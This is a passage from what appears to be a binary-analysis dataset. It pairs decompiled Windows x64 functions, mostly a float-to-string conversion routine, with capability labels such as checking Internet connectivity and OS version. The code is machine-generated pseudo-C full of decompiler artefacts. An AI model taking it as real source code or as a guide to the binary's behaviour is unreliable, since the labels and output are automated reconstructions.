dVar23) {\n                            do {\n                                if (dVar22 - dVar23 < dVar25) {\n                                    uVar15 = *(puVar14 + -1);\n                                    goto code_r0x000140014df1;\n                                }\n                                uStack76 = uStack76 + 1;\n                                if (uStack168 <= uStack76) goto code_r0x00014001508e;\n                                dVar23 = dVar23 * dVar24;\n                                puVar16 = puVar14 + 1;\n                                dVar25 = dVar25 * dVar24;\n                                iVar7 = dVar23;\n                                *puVar14 = iVar7 + 0x30;\n                                dVar23 = dVar23 - iVar7;\n                                puVar14 = puVar16;\n                            } while (dVar25 <= dVar23);\n                        }\n                        uStack136._0_4_ = uVar21 + 1;\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar23 != 0.0) << 4;\n                        puVar17 = puStack144;\n                        goto code_r0x000140015005;\n                    }\n                    dVar26 = dVar26 * dVar25;\n                    uStack76 = 1;\n                    puVar16 = puStack144;\n                    dVar25 = dVar22;\n                    bVar3 = false;\n                    while( true ) {\n                        iVar8 = dVar25;\n                        if (iVar8 != 0) {\n                            dVar25 = dVar25 - iVar8;\n                            bVar3 = bVar2;\n                        }\n                        uVar15 = iVar8 + 0x30;\n                        puVar14 = puVar16 + 1;\n                        *puVar16 = uVar15;\n                        if (uStack76 == uStack168) break;\n                        dVar25 = dVar25 * dVar24;\n                        uStack76 = uStack76 + 1;\n                        puVar16 = puVar14;\n                        bVar3 = bVar2;\n                    }\n                    if (!bVar3) {\n                        dVar25 = dVar22;\n                    }\n                    if (dVar26 + *0x140102890 < dVar25) {\ncode_r0x000140014df1:\n                        do {\n                            puVar16 = puVar14 + -1;\n                            if (uVar15 != '9') goto code_r0x000140014dfb;\n                            if (puStack144 == puVar16) {\n                                uVar21 = uVar21 + 1;\n                                uVar18 = 0x31;\n                                goto code_r0x000140014e04;\n                            }\n                            uVar15 = *(puVar14 + -2);\n                            puVar14 = puVar16;\n                        } while( true );\n                    }\n                    if (dVar25 < *0x140102890 - dVar26) {\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar25 != 0.0) << 4;\ncode_r0x000140015da0:\n                        do {\n                            puVar16 = puVar14;\n                            puVar14 = puVar16 + -1;\n                        } while (*(puVar16 + -1) == 0x30);\n                        uStack136._0_4_ = uVar21 + 1;\n                        puVar17 = puStack144;\n                        goto code_r0x000140015005;\n                    }\n                    if (-1 < uStack152) {\n                        uStack160 = 0;\n                        if (-1 < arg1[5]) goto code_r0x000140014f8d;\n                        goto code_r0x0001400153d8;\n                    }\n                    uStack160 = 0;\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x000140015158;\n                }\ncode_r0x000140015065:\n                if (dStack104 - *0x140102870 <= dVar25) {\n                    if ((dVar25 ^ *0x140102880) <= dStack104 - *0x140102870) goto code_r0x00014001508e;\n                    goto code_r0x0001400152f6;\n                }\n                uStack136._0_4_ = 2;\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x000140014fdf:\n                *puStack144 = 0x31;\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                puVar17 = puStack144;\n                puStack144 = puStack144 + 1;\n            }\n            else {\ncode_r0x000140014c52:\n                uVar15 = 2;\n                if (-1 < uStack160) {\n                    uVar15 = uStack160;\n                }\n                uStack160 = uVar15;\n                if ((uVar21 & 8) != 0) {\n                    uStack160 = 3 - uVar15;\n                    goto code_r0x000140014c7a;\n                }\ncode_r0x0001400150a0:\n                if (uStack152 < 0) {\ncode_r0x0001400150ae:\n                    if (iStack124 != 0) goto code_r0x0001400150ba;\ncode_r0x0001400153d8:\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x000140015158;\n                }\ncode_r0x000140014f78:\n                iVar20 = *0x140103700;\n                if (arg1[5] < uStack128) goto code_r0x0001400150ae;\ncode_r0x000140014f8d:\n                dVar22 = *(iVar20 + uStack128 * 8);\n                if ((-1 < uStack192) || (0 < uStack168)) {\n                    uStack76 = 1;\n                    uStack136._0_4_ = uStack128 + 1;\n                    uVar6 = dStack104 / dVar22;\n                    *puStack144 = uVar6 + 0x30;\n                    dVar25 = *0x140102858;\n                    puVar5 = puStack144;\n                    for (dVar24 = dStack104 - uVar6 * dVar22; puVar14 = puVar5 + 1,  puVar17 = puStack144, \n                        puVar16 = puVar14,  dVar24 != 0.0; dVar24 = dVar24 * dVar25 - uVar6 * dVar22) {\n                        if (uStack76 == uStack168) {\n                            uVar21 = uStack128;\n                            if (uStack160 == 0) {\n                                uVar15 = *puVar5;\n                                if ((dVar22 < dVar24 + dVar24) || ((dVar24 + dVar24 == dVar22 && ((uVar6 & 1) != 0))))\n                                goto code_r0x000140014df1;\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                goto code_r0x000140015da0;\n                            }\n                            if (uStack160 == 1) {\n                                uVar15 = *puVar5;\n                                goto code_r0x000140014df1;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                            break;\n                        }\n                        uStack76 = uStack76 + 1;\n                        uVar6 = (dVar24 * dVar25) / dVar22;\n                        *puVar14 = uVar6 + 0x30;\n                        puVar5 = puVar14;\n                    }\n                    goto code_r0x000140015005;\n                }\n                if ((uStack168 == 0) && (dVar22 * *0x140102870 < dStack104)) {\n                    uStack136._0_4_ = uStack128 + 2;\n                    arg1_00 = 0;\n                    iVar20 = 0;\n                    goto code_r0x000140014fdf;\n                }\ncode_r0x0001400152f6:\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x0001400152fb:\n                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                uStack136._0_4_ = -uStack192;\n                puVar17 = puStack144;\n            }\n            uStack256 = 0x140014ff8;\n            fcn.140017070(arg1_00);\n            puVar16 = puStack144;\n            if (iVar20 == 0) goto code_r0x000140015005;\n        }\n        else {\n            bVar2 = iVar19 + 0x3fdU < 0x7f8;\n            in_stack_00000028 = 0;\ncode_r0x000140014e38:\n            uStack192 = uStack192 & 0xffffffff00000000 | uVar15;\n            uStack76 = iVar8 * *0x140102848 + 3;\n            uStack256 = 0x140014e66;\n            uStack168 = dStack104;\n            puStack144 = fcn.140014540(uStack76);\n            dVar22 = uStack168;\n            uStack160 = arg1[3] - 1;\n            if (uStack160 != 0) {\n                uStack192 = uStack192._4_4_ << 0x20;\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n                goto code_r0x000140014c52;\n            }\n            uStack192 = uStack192._4_4_ << 0x20;\n            uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n            if (-1 < uStack152) {\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                goto code_r0x000140014f78;\n            }\n            uStack92 = 0xffffffff;\ncode_r0x0001400150ba:\n            uStack76 = (iVar8 - uVar6) + 1;\n            uVar21 = uStack120;\n            if (uStack152 - (iVar8 - uVar6) < arg1[1]) {\n                if ((in_stack_00000028 - 3 & 0xfffffffd) == 0) goto code_r0x0001400157d0;\n                uStack76 = (uStack152 - arg1[1]) + 1;\n                if ((1 < in_stack_00000028 && 0 < uStack168) && (uStack168 < uStack76)) {\n                    if (uStack168 - 1 <= uStack120) {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                        uVar21 = uStack120 - (uStack168 - 1);\n                        goto code_r0x000140015133;\n                    }\n                    goto code_r0x00014001597c;\n                }\n                uStack156 = uStack156 + uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n            }\n            else {\n                if (in_stack_00000028 < 2) {\n                    uStack156 = uStack156 + uStack76;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n                    goto code_r0x000140015133;\n                }\ncode_r0x0001400157d0:\n                if (uStack120 < uStack168 - 1) {\ncode_r0x00014001597c:\n                    uStack192._0_4_ = uStack192 + ((uStack168 - 1) - uStack120);\n                    uStack156 = uStack156 + uStack168;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack76 = uStack168;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    uVar21 = 0;\n                    uStack120 = uStack168 - 1;\n                }\n                else {\n                    uVar21 = uStack120 - (uStack168 - 1);\n                    if (uStack168 < 0) {\n                        uStack76 = 0;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 - uStack168;\n                    }\n                    else {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    }\n                }\n            }\ncode_r0x000140015133:\n            uStack256 = 0x140015145;\n            uStack96 = uStack192;\n            iVar20 = fcn.1400171a0(1);\n            iStack124 = 1;\n            uStack192._0_4_ = uStack96;\ncode_r0x000140015158:\n            if ((0 < uStack152) && (0 < uStack156)) {\n                uStack76 = uStack156;\n                if (uStack152 <= uStack156) {\n                    uStack76 = uStack152;\n                }\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack76;\n                uStack156 = uStack156 - uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack152 - uStack76;\n            }\n            uVar13 = uVar9;\n            if (uStack120 != 0) {\n                if ((iStack124 != 0) && (uVar21 != 0)) {\n                    uStack256 = 0x140015a1c;\n                    uStack96 = uStack192;\n                    iVar20 = fcn.1400173c0(iVar20, uVar21);\n                    uStack256 = 0x140015a2a;\n                    uVar13 = fcn.140017260(iVar20, uVar9);\n                    uStack256 = 0x140015a35;\n                    fcn.140017070(uVar9);\n                    uStack120 = uStack120 - uVar21;\n                    uStack192._0_4_ = uStack96;\n                    if (uStack120 == 0) goto code_r0x0001400151c4;\n                }\n                uStack256 = 0x1400151b9;\n                uStack96 = uStack192;\n                uVar13 = fcn.1400173c0(uVar13, uStack120);\n                uStack192._0_4_ = uStack96;\n            }\ncode_r0x0001400151c4:\n            uStack256 = 0x1400151d6;\n            uStack120 = uStack192;\n            arg1_00 = fcn.1400171a0(1);\n            if (uStack120 == 0) {\n                uStack200._0_4_ = uStack120;\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) &&\n                   (bVar2 = arg1[1] + 1 < uStack200,  uStack200._0_4_ = uStack120,  bVar2)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                uVar21 = 0x1f;\n            }\n            else {\n                uStack256 = 0x14001575b;\n                arg1_00 = fcn.1400173c0(arg1_00, uStack120);\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) && (arg1[1] + 1 < uStack200)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                else {\n                    uStack200._0_4_ = 0;\n                }\n                puVar16 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n                uVar21 = 0x1f;\n                if (*puVar16 != 0) {\n                    for (; *puVar16 >> uVar21 == 0; uVar21 = uVar21 - 1) {\n                    }\n                }\n                uVar21 = uVar21 ^ 0x1f;\n            }\n            uVar21 = (uVar21 - uStack156) - 4 & 0x1f;\n            uVar9 = uVar13;\n            uStack76 = uVar21;\n            if (0 < uStack136 + uVar21) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x140015232;\n                uStack136 = arg1_00;\n                uVar9 = fcn.140017540(uVar13, uStack136 + uVar21);\n                arg1_00 = uStack136;\n            }\n            if (0 < uStack156 + uStack76) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x14001525f;\n                arg1_00 = fcn.140017540(arg1_00, uStack156 + uStack76);\n            }\n            bVar2 = 2 < in_stack_00000028;\n            if (iStack116 == 0) {\ncode_r0x00014001527d:\n                if ((uStack168 < 1) && (bVar2)) {\ncode_r0x000140015294:\n                    if (uStack168 == 0) {\n                        uStack256 = 0x1400152ae;\n                        uStack200 = fcn.1400170e0(arg1_00, 5, 0);\n                        uStack256 = 0x1400152be;\n                        iVar8 = fcn.140017650(uVar9, uStack200);\n                        arg1_00 = uStack200;\n                        if (0 < iVar8) {\n                            uStack136._0_4_ = uStack128 + 2;\n                            goto code_r0x000140014fdf;\n                        }\n                    }\n                    goto code_r0x0001400152fb;\n                }\n                uStack136._0_4_ = uStack128 + 1;\n                if (iStack124 != 0) {\ncode_r0x000140015407:\n                    iVar10 = iVar20;\n                    if (0 < uStack152 + uVar21) {\n                        uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                        uStack256 = 0x140015424;\n                        uStack192 = arg1_00;\n                        iVar10 = fcn.140017540(iVar20, uStack152 + uVar21);\n                        arg1_00 = uStack192;\n                    }\n                    uStack200 = arg1_00;\n                    iVar20 = iVar10;\n                    if (uStack200 != 0) {\n                        uStack256 = 0x140015c05;\n                        iVar20 = fcn.140016f80(*(iVar10 + 8));\n                        uStack256 = 0x140015c21;\n                        sub.msvcrt.dll_memcpy(iVar20 + 0x10, iVar10 + 0x10);\n                        uStack256 = 0x140015c2e;\n                        iVar20 = fcn.140017540(iVar20, 1);\n                    }\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136;\n                    uStack76 = 1;\n                    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000028;\n                    puVar14 = puStack144;\ncode_r0x000140015502:\n                    uStack256 = 0x140015516;\n                    iVar8 = fcn.140014630(uVar9, uStack200);\n                    uVar21 = iVar8 + 0x30;\n                    uStack256 = 0x140015527;\n                    uVar6 = fcn.140017650(uVar9, iVar10);\n                    uStack256 = 0x140015537;\n                    uVar13 = fcn.1400176a0(uStack200, iVar20);\n                    if (*(uVar13 + 0x10) == 0) {\n                        uStack256 = 0x140015554;\n                        uStack152 = uVar13;\n                        uStack156 = fcn.140017650(uVar9, uVar13);\n                        uStack256 = 0x140015562;\n                        fcn.140017070(uStack152);\n                        puVar16 = uStack176;\n                        uVar15 = uStack156;\n                        if (((uStack156 | uStack192) != 0) ||\n                           (uVar15 = uStack156 | uStack192,  (*arg3 & 1 | uStack160) != 0)) goto code_r0x00014001546d;\n                        if (uVar21 != 0x39) {\n                            if (uVar6 < 1) {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                if (*(uVar9 + 0x14) < 2) {\n                                    uStack176 = puVar16 & 0xffffffff00000000 | (*(uVar9 + 0x18) != 0) << 4;\n                                }\n                            }\n                            else {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                                uVar21 = iVar8 + 0x31;\n                            }\n                            *puVar14 = uVar21;\n                            puVar16 = puVar14 + 1;\n                            arg1_00 = uStack200;\n                            goto code_r0x0001400155c0;\n                        }\ncode_r0x000140015d29:\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x000140015d2d;\n                    }\n                    uStack256 = 0x140015468;\n                    fcn.140017070(uVar13);\n                    uVar15 = 1;\ncode_r0x00014001546d:\n                    arg1_00 = uStack200;\n                    if ((uVar6 < 0) || (((uVar6 | uStack192) == 0 && ((*arg3 & 1) == 0)))) {\n                        if (uStack160 != 0) {\n                            if ((*(uVar9 + 0x14) < 2) && (*(uVar9 + 0x18) == 0)) {\n                                if (0 < uVar15) goto code_r0x000140015cb3;\n                                puVar16 = puVar14 + 1;\n                                goto code_r0x000140015b92;\n                            }\n                            if (uStack160 == 2) goto code_r0x000140015d12;\n                            uStack200 = uStack200 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                            while( true ) {\n                                puVar16 = puVar14 + 1;\n                                uStack256 = 0x140015b65;\n                                iVar8 = fcn.140017650(arg1_00, iVar20);\n                                if (iVar8 < 1) break;\n                                *puVar14 = uVar21;\n                                uStack256 = 0x140015b28;\n                                iVar11 = fcn.1400170e0(iVar20, 10, 0);\n                                if (iVar10 == iVar20) {\n                                    iVar10 = iVar11;\n                                }\n                                uStack256 = 0x140015b42;\n                                uVar9 = fcn.1400170e0(uVar9, 10, 0);\n                                uStack256 = 0x140015b53;\n                                iVar8 = fcn.140014630(uVar9, arg1_00);\n                                uVar21 = iVar8 + 0x30;\n                                iVar20 = iVar11;\n                                puVar14 = puVar16;\n                            }\n                            uStack136._0_4_ = uStack200;\n                            if (uVar21 == 0x39) {\ncode_r0x000140015d2d:\n                                *puVar14 = 0x39;\n                                puVar17 = puStack144;\n                                puVar14 = puVar16;\n                                goto code_r0x000140015949;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                            uVar21 = uVar21 + 1;\ncode_r0x000140015b92:\n                            *puVar14 = uVar21;\n                            goto code_r0x0001400155c0;\n                        }\n                        if (0 < uVar15) {\ncode_r0x000140015cb3:\n                            uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                            uStack256 = 0x140015ccf;\n                            uStack176 = puVar14;\n                            uVar9 = fcn.140017540(uVar9, 1);\n                            uStack256 = 0x140015cdf;\n                            iVar7 = fcn.140017650(uVar9, uStack200);\n                            puVar14 = uStack176;\n                            if ((iVar7 < 1) && ((iVar7 != 0 || ((uStack192 & 1) == 0)))) {\n                                uStack160 = 0x20;\n                                uVar21 = uStack192;\n                            }\n                            else {\n                                if (uStack192 == 0x39) goto code_r0x000140015d29;\n                                uStack160 = 0x20;\n                                uVar21 = iVar8 + 0x31;\n                            }\n                        }\n                        if (*(uVar9 + 0x14) < 2) {\n                            if (*(uVar9 + 0x18) == 0) {\n                                puVar16 = puVar14 + 1;\n                                uStack176 = uStack176 & 0xffffffff00000000 | uStack160;\n                                arg1_00 = uStack200;\n                                goto code_r0x000140015b92;\n                            }\n                        }\n                        else {\ncode_r0x000140015d12:\n                        }\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x000140015b92;\n                    }\n                    puVar16 = puVar14 + 1;\n                    if ((0 < uVar15) && (uStack160 != 2)) {\n                        if (uVar21 == 0x39) goto code_r0x000140015d2d;\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = uVar21 + 1;\n                        goto code_r0x0001400155c0;\n                    }\n                    *puVar14 = uVar21;\n                    if (uStack76 != uStack168) goto code_r0x0001400154b3;\n                    goto code_r0x0001400156f9;\n                }\n            }\n            else {\n                uStack256 = 0x140015625;\n                uStack200 = arg1_00;\n                uStack156 = uStack200;\n                iVar8 = fcn.140017650(uVar9, arg1_00);\n                arg1_00 = uStack200;\n                uStack200._0_4_ = uStack156;\n                if (-1 < iVar8) goto code_r0x00014001527d;\n                uStack168 = uStack200;\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack156;\n                uVar6 = uStack128 - 1;\n                uStack256 = 0x140015659;\n                uVar9 = fcn.1400170e0(uVar9, 10, 0);\n                arg1_00 = uStack168;\n                bVar3 = 0 < uStack92;\n                if (iStack124 != 0) {\n                    uStack256 = 0x140015e30;\n                    iVar20 = fcn.1400170e0(iVar20, 10, 0);\n                    arg1_00 = uStack168;\n                    if (!bVar2 || bVar3) {\n                        uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                        uStack136._0_4_ = uStack128;\n                        goto code_r0x000140015407;\n                    }\ncode_r0x000140015d54:\n                    arg1_00 = uStack168;\n                    uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                    uStack128 = uVar6;\n                    goto code_r0x000140015294;\n                }\n                if (bVar2 && !bVar3) goto code_r0x000140015d54;\n                uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                uStack136._0_4_ = uStack128;\n            }\n            uStack76 = 1;\n            puVar14 = puStack144;\n            while( true ) {\n                puVar16 = puVar14 + 1;\n                uStack256 = 0x1400156e3;\n                iVar8 = fcn.140014630(uVar9, arg1_00);\n                uVar21 = iVar8 + 0x30;\n                *puVar14 = uVar21;\n                if (uStack168 <= uStack76) break;\n                uStack256 = 0x1400156c0;\n                uVar9 = fcn.1400170e0(uVar9, 10, 0);\n                uStack76 = uStack76 + 1;\n                puVar14 = puVar16;\n            }\n            iVar10 = 0;\ncode_r0x0001400156f9:\n            if (uStack160 == 0) {\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                uStack256 = 0x140015a79;\n                uStack200 = arg1_00;\n                uVar9 = fcn.140017540(uVar9, 1);\n                uStack256 = 0x140015a89;\n                iVar8 = fcn.140017650(uVar9, uStack200);\n                puVar17 = puStack144;\n                arg1_00 = uStack200;\n                puVar14 = puVar16;\n                if ((iVar8 < 1) && ((iVar8 != 0 || ((uStack192 & 1) == 0)))) goto code_r0x000140015aa7;\ncode_r0x000140015949:\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                    if (*(puVar16 + -1) != 0x39) {\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = *(puVar16 + -1) + 1;\n                        goto code_r0x0001400155c0;\n                    }\n                } while (puVar17 != puVar14);\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                uStack136._0_4_ = uStack136 + 1;\n                *puStack144 = 0x31;\n            }\n            else {\n                if (uStack160 == 2) {\ncode_r0x000140015aa7:\n                    uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                    puVar14 = puVar16;\n                    if (*(uVar9 + 0x14) < 2) {\n                        iVar8 = *(uVar9 + 0x18);\n                        goto code_r0x000140015725;\n                    }\n                }\n                else {\n                    puVar17 = puStack144;\n                    puVar14 = puVar16;\n                    if ((1 < *(uVar9 + 0x14)) || (iVar8 = *(uVar9 + 0x18),  iVar8 != 0)) goto code_r0x000140015949;\ncode_r0x000140015725:\n                    uStack176 = uStack176 & 0xffffffff00000000 | (iVar8 != 0) << 4;\n                    puVar14 = puVar16;\n                }\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                } while (*(puVar16 + -1) == 0x30);\n            }\ncode_r0x0001400155c0:\n            uStack256 = 0x1400155c8;\n            fcn.140017070(arg1_00);\n            puVar17 = puStack144;\n            if (iVar20 == 0) goto code_r0x000140015005;\n            if ((iVar10 != 0) && (iVar10 != iVar20)) {\n                uStack256 = 0x1400155e3;\n                fcn.140017070(iVar10);\n                puVar17 = puStack144;\n            }\n        }\n        puStack144 = puVar16;\n        uStack256 = 0x140015005;\n        fcn.140017070(iVar20);\n        puVar16 = puStack144;\ncode_r0x000140015005:\n        puStack144 = puVar16;\n        uStack256 = 0x14001500d;\n        fcn.140017070(uVar9);\n        *puStack144 = 0;\n        *puStack216 = uStack136;\n        if (ppuStack208 != NULL) {\n            *ppuStack208 = puStack144;\n        }\n        *puStack184 = *puStack184 | uStack176;\n        return puVar17;\n    }\n    uStack256 = 0x140014ab8;\n    fcn.140017070(uVar9);\ncode_r0x000140014ab8:\n    uVar21 = 1;\n    pcVar12 = 0x14010281d;\n    *puStack216 = 1;\n    *0x20 = &stack0xffffffffffffff00;\n    uStack256 = 0x140014ada;\n    unaff_RBX = uVar9;\n    unaff_RSI = arg3;\n    unaff_RDI = in_stack_00000028;\ncode_r0x000140014580:\n    *(*0x20 + -8) = unaff_RDI;\n    *(*0x20 + -0x10) = unaff_RSI;\n    *(*0x20 + -0x18) = unaff_RBX;\n    if (uVar21 < 0x1c) {\n        uVar6 = 0;\n    }\n    else {\n        iVar8 = 4;\n        uVar6 = 0;\n        do {\n            iVar8 = iVar8 * 2;\n            uVar6 = uVar6 + 1;\n        } while (iVar8 + 0x17 < uVar21);\n    }\n    *(*0x20 + -0x40) = 0x1400145b4;\n    puVar14 = fcn.140016f80(uVar6);\n    *puVar14 = uVar6;\n    uVar18 = *pcVar12;\n    *(puVar14 + 1) = uVar18;\n    puVar16 = puVar14 + 1;\n    while (uVar18 != 0) {\n        pcVar12 = pcVar12 + 1;\n        uVar18 = *pcVar12;\n        puVar16 = puVar16 + 1;\n        *puVar16 = uVar18;\n    }\n    if (ppuStack208 != NULL) {\n        *ppuStack208 = puVar16;\n    }\n    return puVar14 + 1;\n}\n",
        "token_count": 11912
    },
    "140015f9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t fcn.140015f90(uint8_t **arg1, uint32_t *arg2, uint32_t *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint8_t *puVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint8_t **ppuVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    int64_t iVar14;\n    uint *puVar15;\n    uint64_t uVar16;\n    uint32_t *puVar17;\n    uint8_t uVar18;\n    uint32_t uVar19;\n    uint8_t *puVar20;\n    uint32_t uVar21;\n    int32_t iVar22;\n    uint8_t *puVar23;\n    uint32_t *puVar24;\n    bool bVar25;\n    uint32_t in_stack_00000028;\n    \n    ppuVar9 = sub.msvcrt.dll_localeconv();\n    iVar10 = *0x140103630;\n    puVar4 = *ppuVar9;\n    if (*(*0x140103630 + 0x30) == '\\0') {\n        fcn.1400169c0();\n    }\n    *arg4 = 0;\n    puVar23 = *arg1;\n    uVar18 = puVar23[2];\n    if (uVar18 == 0x30) {\n        puVar13 = puVar23 + 3;\n        do {\n            puVar12 = puVar13;\n            uVar18 = *puVar12;\n            puVar13 = puVar12 + 1;\n        } while (uVar18 == 0x30);\n        iVar6 = (puVar12 - (puVar23 + 3)) + 1;\n    }\n    else {\n        puVar12 = puVar23 + 2;\n        iVar6 = 0;\n    }\n    uVar2 = *puVar4;\n    puVar23 = puVar12;\n    if (*(iVar10 + uVar18) == '\\0') {\n        iVar14 = 0;\n        puVar13 = puVar12;\n        uVar3 = uVar2;\n        if (uVar2 != 0) {\n            do {\n                if (puVar12[iVar14] != uVar3) goto code_r0x000140016043;\n                iVar14 = iVar14 + 1;\n                uVar3 = puVar4[iVar14];\n            } while (uVar3 != 0);\n            puVar13 = puVar12 + iVar14;\n            uVar18 = *puVar13;\n            if (*(iVar10 + uVar18) != '\\0') {\n                puVar12 = puVar13;\n                if (uVar18 != 0x30) {\n                    bVar25 = false;\ncode_r0x000140016441:\n                    iVar6 = 1;\n                    puVar23 = puVar12;\n                    goto code_r0x000140016170;\n                }\n                do {\n                    uVar18 = puVar12[1];\n                    puVar12 = puVar12 + 1;\n                } while (uVar18 == 0x30);\n                bVar25 = *(iVar10 + uVar18) == '\\0';\n                if (!bVar25) goto code_r0x000140016441;\n                iVar6 = 1;\n                puVar23 = puVar12;\n                if (uVar18 == uVar2) goto code_r0x000140016269;\n                goto code_r0x000140016187;\n            }\n        }\ncode_r0x000140016043:\n        uVar19 = 0;\n        bVar25 = true;\n        if ((uVar18 & 0xdf) == 0x50) goto code_r0x000140016288;\n        bVar25 = true;\n        uVar19 = 0;\n        uVar7 = 0;\n        bVar5 = false;\n        puVar12 = puVar13;\ncode_r0x00014001606a:\n        puVar20 = puVar13;\n        if (iVar6 == 0) {\n            puVar12 = puVar23 + -1;\n        }\ncode_r0x000140016075:\n        *arg1 = puVar12;\n        if (bVar25) {\n            return 0;\n        }\n        if (bVar5) {\n            uVar19 = arg2[3];\n            if (uVar7 != 0) {\n                if (uVar19 == 2) {\n                    if (in_stack_00000028 != 0) goto code_r0x0001400164f5;\n                }\n                else if ((uVar19 != 3) || (in_stack_00000028 == 0)) goto code_r0x0001400164f5;\n                iVar14 = fcn.140016f80(0);\n                *(iVar14 + 0x14) = 0x100000001;\n                uVar7 = arg2[1];\n                goto code_r0x000140016490;\n            }\n            if (uVar19 == 2) {\n                if (in_stack_00000028 != 0) goto code_r0x0001400160b4;\n            }\n            else if (uVar19 == 3) {\n                if (in_stack_00000028 == 0) {\ncode_r0x0001400160b4:\n                    uVar19 = *arg2 & 0x1f;\n                    uVar21 = *arg2 >> 5;\n                    iVar22 = (uVar21 + 1) - (uVar19 == 0);\n                    uVar16 = 0;\n                    iVar6 = iVar22;\n                    while (iVar6 = iVar6 >> 1,  iVar6 != 0) {\n                        uVar16 = uVar16 + 1;\n                    }\n                    iVar10 = fcn.140016f80(uVar16);\n                    *arg4 = iVar10;\n                    *(iVar10 + 0x14) = iVar22;\n                    if (0 < uVar21) {\n                        sub.msvcrt.dll_memset(iVar10 + 0x18, 0xff, uVar21 * 4);\n                        uVar7 = uVar21;\n                    }\n                    if (uVar21 < iVar22) {\n                        *(iVar10 + 0x18 + uVar7 * 4) = 0x20 >> (-uVar19 & 0x1fU);\n                    }\n                    *arg3 = arg2[1];\n                    return 0x11;\n                }\n            }\n            else if (uVar19 != 1) goto code_r0x0001400160b4;\n            goto code_r0x000140016588;\n        }\n    }\n    else {\n        iVar6 = iVar6 + 1;\n        bVar25 = false;\n        puVar13 = NULL;\ncode_r0x000140016170:\n        do {\n            puVar20 = puVar12 + 1;\n            puVar12 = puVar12 + 1;\n        } while (*(iVar10 + *puVar20) != '\\0');\n        if (*puVar20 == uVar2) {\n            if (puVar13 == NULL) {\n                